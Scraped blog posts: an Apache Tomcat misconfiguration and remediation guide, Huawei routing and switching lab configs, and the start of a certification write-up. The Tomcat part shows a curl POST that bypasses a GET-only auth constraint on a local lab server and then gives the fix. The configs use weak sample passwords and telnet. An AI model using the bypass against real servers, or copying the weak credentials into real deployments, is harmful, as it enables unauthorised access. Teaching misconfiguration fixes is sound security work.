‚îÇ¬†‚îú‚îÄ‚îÄ HelloServlet.java ‚îÇ¬†‚îú‚îÄ‚îÄ SupermanServlet.class ‚îÇ¬†‚îî‚îÄ‚îÄ SupermanServlet.java ‚îî‚îÄ‚îÄ web.xml We can specify a custom error page like this\n1 2 3 4 5 6 7 8 9 10 11 12 13 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;ISO-8859-1\u0026#34;?\u0026gt; \u0026lt;web-app version=\u0026#34;3.0\u0026#34; xmlns=\u0026#34;http://java.sun.com/xml/ns/javaee\u0026#34; xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34; xsi:schemaLocation=\u0026#34;http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_3_0.xsd\u0026#34;\u0026gt; \u0026lt;error-page\u0026gt; \u0026lt;exception-type\u0026gt;java.lang.Throwable\u0026lt;/exception-type\u0026gt; \u0026lt;location\u0026gt;/error/error.html\u0026lt;/location\u0026gt; \u0026lt;/error-page\u0026gt; \u0026lt;error-page\u0026gt; \u0026lt;!--Catch all--\u0026gt; \u0026lt;location\u0026gt;/error/error.html\u0026lt;/location\u0026gt; \u0026lt;/error-page\u0026gt; \u0026lt;/web-app\u0026gt; To verify,\n1 2 3 4 5 6 7 8 9 10 11 curl http://localhost:8080/hello-world/WEB-INF/abc/ \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Error\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;üö®ERRORüö®\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;Roses are red, Violets are blue, This is an error page, Goodbye to you too.\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Broken Authorization Example vulnerable configuration 1 2 3 4 5 6 7 8 9 10 \u0026lt;security-constraint\u0026gt; \u0026lt;web-resource-collection\u0026gt; \u0026lt;web-resource-name\u0026gt;secret\u0026lt;/web-resource-name\u0026gt; \u0026lt;url-pattern\u0026gt;/secret/*\u0026lt;/url-pattern\u0026gt; \u0026lt;http-method\u0026gt;GET\u0026lt;/http-method\u0026gt; \u0026lt;/web-resource-collection\u0026gt; \u0026lt;auth-constraint\u0026gt; \u0026lt;role-name\u0026gt;admin\u0026lt;/role-name\u0026gt; \u0026lt;/auth-constraint\u0026gt; \u0026lt;/security-constraint\u0026gt; This configuration ensures that all GET request will be authenticated and only admin users is authorized to access. To bypass, we can use any other http methods 1 2 3 4 5 6 7 8 curl http://localhost:8080/hello-world/secret/secret.html -X POST \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt;\u0026lt;title\u0026gt;Secret Page\u0026lt;/title\u0026gt;\u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;My Secret is I have no secrets\u0026lt;/h1\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Apparently, older versions of Tomcat allows access with junk HTTP methods too. To remediate, remove the \u0026lt;http-method\u0026gt; tag 1 2 3 4 5 6 7 8 9 \u0026lt;security-constraint\u0026gt; \u0026lt;web-resource-collection\u0026gt; \u0026lt;web-resource-name\u0026gt;secret\u0026lt;/web-resource-name\u0026gt; \u0026lt;url-pattern\u0026gt;/secret/*\u0026lt;/url-pattern\u0026gt; \u0026lt;/web-resource-collection\u0026gt; \u0026lt;auth-constraint\u0026gt; \u0026lt;role-name\u0026gt;admin\u0026lt;/role-name\u0026gt; \u0026lt;/auth-constraint\u0026gt; \u0026lt;/security-constraint\u0026gt; It will now apply to all methods. HTTP Enabled Obviously, it is because no SSL certificate is configured We can verify it is vulnerable if the scheme is HTTP and not HTTPS. To remediate, First, create a certificate 1 keytool -genkey -alias tomcat -keyalg RSA -keystore mycertificate.cert Let\u0026rsquo;s say Password: admin1234 (Poor password haha) Output:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 Enter keystore password: Re-enter new password: Enter the distinguished name. Provide a single dot (.) to leave a sub-component empty or press ENTER to use the default value in braces. What is your first and last name? [Unknown]: superheroes.com What is the name of your organizational unit? [Unknown]: What is the name of your organization? [Unknown]: What is the name of your City or Locality? [Unknown]: What is the name of your State or Province? [Unknown]: What is the two-letter country code for this unit? [Unknown]: Is CN=superheroes.com, OU=Unknown, O=Unknown, L=Unknown, ST=Unknown, C=Unknown correct? [no]: yes Generating 3,072 bit RSA key pair and self-signed certificate (SHA384withRSA) with a validity of 90 days for: CN=superheroes.com, OU=Unknown, O=Unknown, L=Unknown, ST=Unknown, C=Unknown In \u0026lt;root\u0026gt;/conf/web.xml,\n1 2 3 4 5 6 7 8 9 10 \u0026lt;Connector port=\u0026#34;8443\u0026#34; protocol=\u0026#34;org.apache.coyote.http11.Http11NioProtocol\u0026#34; maxThreads=\u0026#34;150\u0026#34; SSLEnabled=\u0026#34;true\u0026#34; maxParameterCount=\u0026#34;1000\u0026#34; \u0026gt; \u0026lt;UpgradeProtocol className=\u0026#34;org.apache.coyote.http2.Http2Protocol\u0026#34; /\u0026gt; \u0026lt;SSLHostConfig\u0026gt; \u0026lt;Certificate certificateKeystoreFile=\u0026#34;/home/kali/mycertificate.cert\u0026#34; certificateKeystorePassword=\u0026#34;admin1234\u0026#34; type=\u0026#34;RSA\u0026#34; /\u0026gt; \u0026lt;/SSLHostConfig\u0026gt; \u0026lt;/Connector\u0026gt; This will just open a HTTPS port on port 8443. We can verify with a Nmap port scan 1 sudo nmap localhost -p 8443 --script=ssl-cert Output:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 Host is up (0.000079s latency). Other addresses for localhost (not scanned): ::1 PORT STATE SERVICE 8443/tcp open https-alt | ssl-cert: Subject: commonName=superman/organizationName=Unknown/stateOrProvinceName=Unknown/countryName=Unknown | Issuer: commonName=superman/organizationName=Unknown/stateOrProvinceName=Unknown/countryName=Unknown | Public Key type: rsa | Public Key bits: 3072 | Signature Algorithm: sha384WithRSAEncryption | Not valid before: 2025-11-08T08:27:53 | Not valid after: 2026-02-06T08:27:53 | MD5: eb11:2281:1c16:8b54:5ca6:0347:36ea:27c0 |_SHA-1: 7045:713e:da36:eadc:2c39:2703:424c:ebb0:3323:46d2 Nmap done: 1 IP address (1 host up) scanned in 0.18 seconds Of course, it is self-signed, so it is probably a LOW or INFO finding depending on whether it is internal-facing. Missing Content Security Policy (CSP) Header To verify, 1 curl http://localhost:8081 -I Output:\n1 2 3 HTTP/1.1 200 Content-Type: text/html;charset=UTF-8 Date: Sat, 08 Nov 2025 08:52:41 GMT Missing Content Security Policy Header Remediation: Look below How to configure (the most restrictive) CSP Dependencies: https://commons.apache.org/codec/download_codec.cgi 1 2 # Download the JAR file and place it in the /lib of your tomcat instance cp commons-codec.jar \u0026#39;/home/kali/learning_materials/tomcat and jsp/apache-tomcat-10.1.48/lib\u0026#39; First, we need to compile this 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 // webapps/\u0026lt;web-app-name\u0026gt;/WEB-INF/classes/CSPPoliciesApplier.java import java.io.IOException; import java.security.MessageDigest; import java.security.NoSuchAlgorithmException; import java.security.SecureRandom; import java.util.ArrayList; import java.util.List; /* for Tomcat 9 and below import javax.servlet.Filter; import javax.servlet.FilterChain; import javax.servlet.FilterConfig; import javax.servlet.ServletException; import javax.servlet.ServletRequest; import javax.servlet.ServletResponse; import javax.servlet.annotation.WebFilter; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; */ import jakarta.servlet.Filter; import jakarta.servlet.FilterChain; import jakarta.servlet.FilterConfig; import jakarta.servlet.ServletException; import jakarta.servlet.ServletRequest; import jakarta.servlet.ServletResponse; import jakarta.servlet.annotation.WebFilter; import jakarta.servlet.http.HttpServletRequest; import jakarta.servlet.http.HttpServletResponse; import org.apache.commons.codec.binary.Hex; /** * Sample filter implementation to define a set of Content Security Policies.\u0026lt;br/\u0026gt; * This implementation has a dependency on Commons Codec API.\u0026lt;br/\u0026gt; * This filter set CSP policies using all HTTP headers defined into W3C specification.\u0026lt;br/\u0026gt; * \u0026lt;br/\u0026gt; * This implementation is oriented to be easily understandable and easily adapted.\u0026lt;br/\u0026gt; */ @WebFilter(\u0026#34;/*\u0026#34;) public class CSPPoliciesApplier implements Filter { /** Configuration member to specify if web app use web fonts */ public static final boolean APP_USE_WEBFONTS = false; /** Configuration member to specify if web app use videos or audios */ public static final boolean APP_USE_AUDIOS_OR_VIDEOS = false; /** * Configuration member to specify if filter must add CSP directive used by Mozilla (Firefox) */ public static final boolean INCLUDE_MOZILLA_CSP_DIRECTIVES = false; /** Filter configuration */ @SuppressWarnings(\u0026#34;unused\u0026#34;) private FilterConfig filterConfig = null; /** List CSP HTTP Headers */ private List\u0026lt;String\u0026gt; cspHeaders = new ArrayList\u0026lt;String\u0026gt;(); /** Collection of CSP polcies that will be applied */ private String policies = null; /** Used for Script Nonce */ private SecureRandom prng = null; /** * Used to prepare (one time for all) set of CSP policies that will be applied on each HTTP * response. * * @see javax.servlet.Filter#init(javax.servlet.FilterConfig) */ @Override public void init(FilterConfig fConfig) throws ServletException { // Get filter configuration this.filterConfig = fConfig; // Init secure random try { this.prng = SecureRandom.getInstance(\u0026#34;SHA1PRNG\u0026#34;); } catch (NoSuchAlgorithmException e) { throw new ServletException(e); } // Define list of CSP HTTP Headers this.cspHeaders.add(\u0026#34;Content-Security-Policy\u0026#34;); // this.cspHeaders.add(\u0026#34;X-Content-Security-Policy\u0026#34;); // this.cspHeaders.add(\u0026#34;X-WebKit-CSP\u0026#34;); // Define CSP policies // Loading policies for Frame and Sandboxing will be dynamically defined : We need to know if context use Frame List\u0026lt;String\u0026gt; cspPolicies = new ArrayList\u0026lt;String\u0026gt;(); String originLocationRef = \u0026#34;\u0026#39;self\u0026#39;\u0026#34;; // --Disable default source in order to avoid browser fallback loading using \u0026#39;default-src\u0026#39; // locations cspPolicies.add(\u0026#34;default-src \u0026#39;none\u0026#39;\u0026#34;); // --Define loading policies for Scripts // cspPolicies.add(\u0026#34;script-src \u0026#34; + originLocationRef + \u0026#34; \u0026#39;unsafe-inline\u0026#39; \u0026#39;unsafe-eval\u0026#39;\u0026#34;); \u0026lt;- bad policy! cspPolicies.add(\u0026#34;script-src \u0026#34; + originLocationRef); // not the best but will do if (INCLUDE_MOZILLA_CSP_DIRECTIVES) { cspPolicies.add(\u0026#34;options inline-script eval-script\u0026#34;); cspPolicies.add(\u0026#34;xhr-src \u0026#39;self\u0026#39;\u0026#34;); } // --Define loading policies for Plugins cspPolicies.add(\u0026#34;object-src \u0026#34; + originLocationRef); // --Define loading policies for Styles (CSS) cspPolicies.add(\u0026#34;style-src \u0026#34; + \u0026#34;\u0026#39;unsafe-inline\u0026#39;\u0026#34;); // --Define loading policies for Images cspPolicies.add(\u0026#34;img-src \u0026#34; + originLocationRef); // --Define loading policies for Form cspPolicies.add(\u0026#34;form-action \u0026#34; + originLocationRef); // --Define loading policies for Audios/Videos if (APP_USE_AUDIOS_OR_VIDEOS) { cspPolicies.add(\u0026#34;media-src \u0026#34; + originLocationRef); } // --Define loading policies for Fonts if (APP_USE_WEBFONTS) { cspPolicies.add(\u0026#34;font-src \u0026#34; + originLocationRef); } // --Define loading policies for Connection cspPolicies.add(\u0026#34;connect-src \u0026#34; + originLocationRef); // --Define loading policies for Plugins Types // cspPolicies.add(\u0026#34;plugin-types application/pdf application/x-shockwave-flash\u0026#34;); // --Define browser XSS filtering feature running mode // cspPolicies.add(\u0026#34;reflected-xss block\u0026#34;); // Target formating this.policies = cspPolicies.toString().replaceAll(\u0026#34;(\\\\[|\\\\])\u0026#34;, \u0026#34;\u0026#34;).replaceAll(\u0026#34;,\u0026#34;, \u0026#34;;\u0026#34;) .trim(); } /** * Add CSP policies on each HTTP response. * * @see javax.servlet.Filter#doFilter(javax.servlet.ServletRequest, * javax.servlet.ServletResponse, javax.servlet.FilterChain) */ @Override public void doFilter(ServletRequest request, ServletResponse response, FilterChain fchain) throws IOException, ServletException { HttpServletRequest httpRequest = ((HttpServletRequest) request); HttpServletResponse httpResponse = ((HttpServletResponse) response); /* Step 1 : Detect if target resource is a Frame */ // Customize here according to your context... boolean isFrame = false; /* Step 2 : Add CSP policies to HTTP response */ StringBuilder policiesBuffer = new StringBuilder(this.policies); // If resource is a frame add Frame/Sandbox CSP policy if (isFrame) { // Frame + Sandbox : Here sandbox allow nothing, customize sandbox options depending on // your app.... policiesBuffer.append(\u0026#34;;\u0026#34;).append(\u0026#34;frame-src \u0026#39;self\u0026#39;;sandbox\u0026#34;); if (INCLUDE_MOZILLA_CSP_DIRECTIVES) { policiesBuffer.append(\u0026#34;;\u0026#34;).append(\u0026#34;frame-ancestors \u0026#39;self\u0026#39;\u0026#34;); } } /* // Add Script Nonce CSP Policy // --Generate a random number String randomNum = new Integer(this.prng.nextInt()).toString(); // --Get its digest MessageDigest sha; try { sha = MessageDigest.getInstance(\u0026#34;SHA-1\u0026#34;); } catch (NoSuchAlgorithmException e) { throw new ServletException(e); } byte[] digest = sha.digest(randomNum.getBytes()); // --Encode it into HEXA String scriptNonce = Hex.encodeHexString(digest); policiesBuffer.append(\u0026#34;;\u0026#34;).append(\u0026#34;script-nonce \u0026#34;).append(scriptNonce); // --Made available script nonce in view app layer httpRequest.setAttribute(\u0026#34;CSP_SCRIPT_NONCE\u0026#34;, scriptNonce); */ // Add policies to all HTTP headers for (String header : this.cspHeaders) { httpResponse.setHeader(header, policiesBuffer.toString()); } /* Step 3 : Let request continue chain filter */ fchain.doFilter(request, response); } /** * {@inheritDoc} * * @see javax.servlet.Filter#destroy() */ @Override public void destroy() { // Not used } } To compile, 1 javac -cp \u0026#34;$TOMCAT_HOME/lib/servlet-api.jar:$TOMCAT_HOME/lib/commons-codec.jar\u0026#34; webapps/\u0026lt;web-app-name\u0026gt;/WEB-INF/classes/CSPPoliciesApplier.java Restart the server To confirm, 1 curl -I http://localhost:8080/\u0026lt;web-app-name\u0026gt;/test1/ Output:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 HTTP/1.1 200 Content-Security-Policy: default-src \u0026#39;none\u0026#39;; script-src \u0026#39;self\u0026#39;; object-src \u0026#39;self\u0026#39;; style-src \u0026#39;unsafe-inline\u0026#39;; img-src \u0026#39;self\u0026#39;; form-action \u0026#39;self\u0026#39;; connect-src \u0026#39;self\u0026#39; Accept-Ranges: bytes ETag: W/\u0026#34;299-1762001380542\u0026#34; Last-Modified: Sat, 01 Nov 2025 12:49:40 GMT Content-Type: text/html Content-Length: 299 Date: Sat, 01 Nov 2025 12:50:17 GMT Keep-Alive: timeout=20 Connection: keep-alive ","date":"2025-11-09T07:47:48-05:00","permalink":"https://trinuro.github.io/p/common-apache-tomcat-misconfigurations-and-remediations/","title":"Common Apache Tomcat Misconfigurations and Remediations"},{"content":"IP Routing R1\n1 2 3 4 5 6 7 8 9 10 11 ! Configure IP address int g0/0/1 ip address 192.168.0.254 24 quit int g0/0/0 ip address 10.0.0.1 30 quit ! Configure route ip route-static 192.168.1.0 24 g0/0/0 10.0.0.2 R2\n1 2 3 4 5 6 7 8 9 10 11 ! Configure IP address int g0/0/1 ip address 192.168.1.254 24 quit int g0/0/0 ip address 10.0.0.2 30 quit ! Configure route ip route-static 192.168.0.0 24 g0/0/0 10.0.0.1 PC1\n1 ip 192.168.0.1 255.255.255.0 192.168.0.254 PC2\n1 ip 192.168.1.1 255.255.255.0 192.168.1.254 Verify by pinging OSPF Basics R1\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 ! R1 is the DR ! This interface will face R2 int g0/0/1 ip address 192.168.1.1 24 undo shutdown quit ! Configure OSPF ospf 1 router-id 1.1.1.1 area 0 network 192.168.0.0 0.0.0.255 network 192.168.1.0 0.0.0.255 quit ! Set OSPF priority (Necessary in this case) int g0/0/1 ospf dr-priority 10 quit R2\n1 2 3 4 5 6 7 8 9 10 11 12 13 ! R2 is the BDR ! This interface will face R2 int g0/0/1 undo ip address ip address 192.168.1.2 24 undo shutdown quit ! Configure OSPF ospf 1 router-id 2.2.2.2 area 0 network 192.168.1.0 0.0.0.255 quit Output: Verify by pinging 192.168.0.2 from R2.\nInter-VLAN Communication Layer 3 Switch S1\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 ! Add VLAN vlan batch 10 20 ! Configure access ports int g1/0/1 port link-type access port default vlan 10 quit int g1/0/0 port link-type access port default vlan 20 quit ! Configure VLAN interface interface vlanif 10 ip address 192.168.0.1 24 quit interface vlanif 20 ip address 192.168.1.1 24 quit To verify, ping from PC2 to PC1\nROAS S1\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 ! declare vlans vlan batch 10 20 99 ! Configure access ports int g1/0/0 port link-type access port default vlan 20 quit int g1/0/1 port link-type access port default vlan 10 quit ! Configure trunk port int g1/0/2 port link-type trunk port trunk allow-pass vlan 10 20 port trunk pvid vlan 99 quit R1\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 int g0/0/0 undo ip address quit ! Configure subinterface int g0/0/0.10 ip address 192.168.0.1 24 dot1q termination vid 10 arp broadcast enable quit int g0/0/0.20 ip address 192.168.1.1 24 dot1q termination vid 20 arp broadcast enable quit To verify\n1 2 3 4 5 6 7 8 PC1\u0026gt; ping 192.168.1.2 ping 192.168.1.2 84 bytes from 192.168.1.2 icmp_seq=1 ttl=63 time=4.934 ms 84 bytes from 192.168.1.2 icmp_seq=2 ttl=63 time=1.734 ms 84 bytes from 192.168.1.2 icmp_seq=3 ttl=63 time=2.006 ms 84 bytes from 192.168.1.2 icmp_seq=4 ttl=63 time=1.820 ms 84 bytes from 192.168.1.2 icmp_seq=5 ttl=63 time=1.477 ms ROAS (Hybrid) S1\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 ! declare vlans vlan batch 10 20 99 ! Configure access ports int g1/0/0 port link-type hybrid port hybrid pvid vlan 20 port hybrid untagged vlan 20 quit int g1/0/1 port link-type hybrid port hybrid pvid vlan 10 port hybrid untagged vlan 10 quit ! Configure trunk port int g1/0/2 port link-type hybrid port hybrid pvid vlan 99 port hybrid tagged vlan 10 20 quit R1\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 int g0/0/0 undo ip address quit ! Configure subinterface int g0/0/0.10 ip address 192.168.0.1 24 dot1q termination vid 10 arp broadcast enable quit int g0/0/0.20 ip address 192.168.1.1 24 dot1q termination vid 20 arp broadcast enable quit To verify\n1 2 3 4 5 6 7 8 PC1\u0026gt; ping 192.168.1.2 ping 192.168.1.2 84 bytes from 192.168.1.2 icmp_seq=1 ttl=63 time=4.934 ms 84 bytes from 192.168.1.2 icmp_seq=2 ttl=63 time=1.734 ms 84 bytes from 192.168.1.2 icmp_seq=3 ttl=63 time=2.006 ms 84 bytes from 192.168.1.2 icmp_seq=4 ttl=63 time=1.820 ms 84 bytes from 192.168.1.2 icmp_seq=5 ttl=63 time=1.477 ms Eth-Trunk S1\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 ! Enter eth-trunk interface config interface Eth-Trunk 1 ! Configure eth-trunk mode mode lacp-static ! Configure member interfaces ! My version of switch does not allow ranges trunkport g1/0/0 trunkport g1/0/1 trunkport g1/0/2 ! Configure switchport info for all int port link-type trunk port trunk pvid vlan 1 least active-linknumber 3 quit ! Configure LACP Actor lacp priority 65535 int g1/0/0 distribute-weight 3 int g1/0/1 distribute-weight 3 int g1/0/2 distribute-weight 3 int vlanif 1 ip address 192.168.0.1 24 quit S2\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 ! Enter eth-trunk interface config interface Eth-Trunk 1 ! Configure eth-trunk mode mode lacp-static ! Configure member interfaces ! My version of switch does not allow ranges trunkport g1/0/0 trunkport g1/0/1 trunkport g1/0/2 ! Configure switchport info for all int port link-type trunk port trunk pvid vlan 1 least active-linknumber 3 quit int vlanif 1 ip address 192.168.0.2 24 quit To verify,\n1 [S1]display lacp statistics eth-trunk 1 You can also try pinging from S1 to S2. Access Control List Allow ping only R1\n1 2 3 4 5 6 7 8 9 10 11 acl 3000 ! Allow ping from 192.168.1.0/24 to 192.168.0.0/24 only rule permit icmp source 192.168.1.0 0.0.0.255 destination 192.168.0.0 0.0.0.255 ! Deny all packets to 192.168.0.0/24 rule deny ip source any destination 192.168.0.0 0.0.0.255 quit ! Apply on interface int g0/0/0 traffic-filter inbound acl 3000 quit AAA 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 int g0/0/0 ip address 192.168.0.2 24 quit aaa ! Create a local user local-user superman password cipher huawei123 ! This user can access via telnet local-user superman service-type telnet ! This user can also ping and whatnot local-user superman privilege level0 quit ! Start SSH server stelnet server enable !apply AAA on the VTY user-interface vty 0 4 authentication-mode aaa To verify, SSH into the server and see what commands are allowed. Network Address Translation Static NAT 1 2 3 4 5 6 7 8 9 10 ! Configure interfaces IP int g0/0/0 ip address 12.0.0.1 24 quit int g0/0/1 ip address 192.168.0.1 24 quit ! Configure NAT Pool nat To verify, on the ubuntu server, run sudo tcpdump -i ens3 icmp -n, then ping from PC1. As you can see, Ubuntu thinks that it received packets from 12.0.0.2.\nDynamic NAT 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 ! Configure interfaces IP int g0/0/0 ip address 12.0.0.1 24 quit int g0/0/1 ip address 192.168.0.1 24 quit ! Configure NAT Pool nat address-group 1 12.0.0.3 12.0.0.10 ! Configure ACL acl 2000 rule permit source 192.168.0.0 0.0.0.255 quit ! Configure exit interface int g0/0/0 nat outbound 2000 address-group 1 no-pat quit To confirm,\n1 2 3 4 5 6 7 8 [Huawei]display nat outbound interface g0/0/0 NAT Outbound Information: -------------------------------------------------------------------------- Interface Acl Address-group/IP/Interface Type -------------------------------------------------------------------------- GigabitEthernet0/0/0 2000 1 no-pat -------------------------------------------------------------------------- Total : 1 To verify, on the ubuntu server, run sudo tcpdump -i ens3 icmp -n, then ping from PC1. As you can see, Ubuntu thinks that it received packets from 12.0.0.3.\nNAPT To configure NAPT, 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 ! Configure interfaces IP int g0/0/0 ip address 12.0.0.1 24 quit int g0/0/1 ip address 192.168.0.1 24 quit ! Configure NAT Pool nat address-group 2 12.0.0.11 12.0.0.12 ! Configure ACL acl 2000 rule permit source 192.168.0.0 0.0.0.255 quit ! Configure exit interface int g0/0/0 nat outbound 2000 address-group 2 quit To verify the finding, on the ubuntu server, run sudo tcpdump -i ens3 icmp -n, then ping from PC1. Change the IP of the PC1 thrice. Easy IP 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 ! Configure interfaces IP int g0/0/0 ip address 12.0.0.1 24 quit int g0/0/1 ip address 192.168.0.1 24 quit ! Configure ACL acl 2000 rule permit source 192.168.0.0 0.0.0.255 quit ! Configure exit interface int g0/0/0 nat outbound 2000 quit int g0/0/0 undo nat outbound 2000 address-group 2 quit To verify, on the ubuntu server, run sudo tcpdump -i ens3 icmp -n, then ping from PC1. The server receives ICMP packets whose source IP address is that of the interface. Network Services FTP 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 int g0/0/0 ip address 12.0.0.1 24 quit int Loopback 1 ip address 1.1.1.1 32 quit ! Solves \u0026#34;Error: Before enabling the service, configure the function of logging in to the device through a specified interface.\u0026#34; ftp server permit interface all ftp server-source -i Loopback 1 ftp server-source -a 1.1.1.1 ftp server enable aaa local-user john password irreversible-cipher john1234 local-user john service-type ftp local-user john privilege level 3 local-user john ftp-directory flash:/superman quit Output: Telnet 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 ! Configure interface int g0/0/0 ip address 12.0.0.1 24 quit int Loopback 1 ip address 1.1.1.1 32 quit ! Configure telnet Server telnet server permit interface all telnet server-source -a 1.1.1.1 telnet server-source -i Loopback 1 telnet server enable ! telnet server aaa local-user jack password irreversible-cipher jack1234 local-user jack service-type telnet local-user jack privilege level 3 quit Output: DHCP 1 2 3 4 5 6 7 8 9 10 11 12 13 14 ! Enable DHCP dhcp enable ! Configure DHCP ip pool supercool network 12.0.0.0 mask 255.255.255.0 gateway-list 12.0.0.1 dns-list 8.8.8.8 quit ! Enable interface for DHCP int g0/0/0 dhcp select global quit Output: PPPOE R1 (Server)\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 aaa local-user superman password cipher huawei123 local-user superman service-type ppp quit ip pool POOL1 network 192.168.0.0 mask 24 quit int virtual-template 1 ip address 192.168.0.254 24 remote address pool POOL1 ppp authentication-mode chap quit int g0/0/1 pppoe-server bind virtual-template 1 quit R2 (Client)\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 dialer-rule dialer-rule 1 ip permit quit int dialer 1 dialer user superman dialer-group 1 dialer bundle 1 ppp chap user superman ppp chap password cipher huawei123 ip address ppp-negotiate quit int g0/0/1 pppoe-client dial-bundle-number 1 quit Verify\n1 2 3 4 [R2]display pppoe-client session summary PPPoE Client Session: ID Bundle Dialer Intf Client-MAC Server-MAC State 1 1 1 GE0/0/1 0ce6d0910001 0c27735f0001 UP Network Management and Operations and Maintenance SNMPv2c 1 2 3 4 5 6 7 8 9 int Loopback 1 ip address 1.1.1.1 32 quit snmp-agent //Start the SNMP agent service. snmp-agent sys-info version v2c //Set the SNMP version to v2c. snmp-agent mib-view included View_ALL iso //Create a MIB view View_ALL. snmp-agent community read cipher Public123 mib-view View_ALL //Configure a read community name and set the rights of the MIB view. snmp-agent protocol source-interface Loopback 1 //This step must be performed in V200R020 and later versions On the host,\n1 snmpwalk -v 2c -c Public123 1.1.1.1 Output: SNMPv3 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 int Loopback 1 ip address 1.1.1.1 32 quit int g0/0/0 ip address 192.168.0.254 24 quit ! Enable SNMP version 3 snmp-agent sys-info version v3 ! Configure MIB view snmp-agent mib-view isoview include iso ! Configure the user group snmp-agent group v3 company_admin privacy read-view isoview write-view isoview notify-view isoview ! Configure user snmp-agent usm-user v3 superman group company_admin ! Configure authentication password (and hash) snmp-agent usm-user v3 superman authentication-mode sha ! (superman123) ! Configure sync encryption snmp-agent usm-user v3 superman privacy-mode aes128 ! superman1234 ! Configure admin contact info snmp-agent sys-info contact I just call to say I love you On the host,\n1 snmpwalk -u superman -a sha -A superman123 1.1.1.1 Output: To verify,\n1 \u0026lt;R1\u0026gt;display snmp-agent sys-info Output:\n1 2 3 4 5 6 7 8 The contact person for this managed node: I just call to say I love you The physical location of this node: Shenzhen China SNMP version running in the system: SNMPv3 and\n1 \u0026lt;R1\u0026gt;display snmp-agent usm-user Output:\n1 2 3 4 5 6 7 8 User name: superman Engine ID: 800007DB03000000000000 Group name: company_admin Authentication mode: sha, Privacy mode: aes128 Storage type: nonVolatile User status: active Total number is 1 IPv6 R1\n1 2 3 4 5 6 7 ipv6 int g0/0/0 ipv6 enable ipv6 address auto link-local ipv6 address 2001::1 64 quit R2\n1 2 3 4 5 6 7 ipv6 int g0/0/0 ipv6 enable ipv6 address auto link-local ipv6 address 2001::2 64 quit To verify\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 [R1]ping ipv6 2001::2 PING 2001::2 : 56 data bytes, press CTRL_C to break Reply from 2001::2 bytes=56 Sequence=1 hop limit=64 time = 8 ms Reply from 2001::2 bytes=56 Sequence=2 hop limit=64 time = 2 ms Reply from 2001::2 bytes=56 Sequence=3 hop limit=64 time = 1 ms Reply from 2001::2 bytes=56 Sequence=4 hop limit=64 time = 3 ms Reply from 2001::2 bytes=56 Sequence=5 hop limit=64 time = 2 ms --- 2001::2 ping statistics --- 5 packet(s) transmitted 5 packet(s) received 0.00% packet loss round-trip min/avg/max = 1/3/8 ms ","date":"2025-10-17T06:52:25-04:00","permalink":"https://trinuro.github.io/p/huawei-lab-fever/","title":"Huawei Lab Fever"},{"content":"Whassup people. Chronic Cert Collector here! Long story short, I recently got the Huawei Certified ICT Associate (HCIA) Datacom. Honestly, it was a refresh of CCNA topics, however, there are a few extra topics that is emphasised in HCIA Datacom but not CCNA, which I will get into later.\nGeneral Tips The information in Huawei ICT Academy is sufficient to pass the exam. A lab is not needed to pass (in my opinion), however, I highly recommend having labs because hands-on experience is absolutely invaluable. I hate memorizing commands. For those that come from Cisco background, familiarize yourself with the terms and commands used. Not everything is 1-to-1 with Cisco. Some interesting differences include: CCNA HCIA Default administrative distance of internal OSPF is higher than static route Default preference of internal OSPF is lower than that of static route No concept of \u0026ldquo;hybrid\u0026rdquo; ports. (At least at the CCNA level) Hybrid ports are taught, basically switchports that can forward more than one vlans untagged. PPP and PPPOE theory and configuration not emphasised. 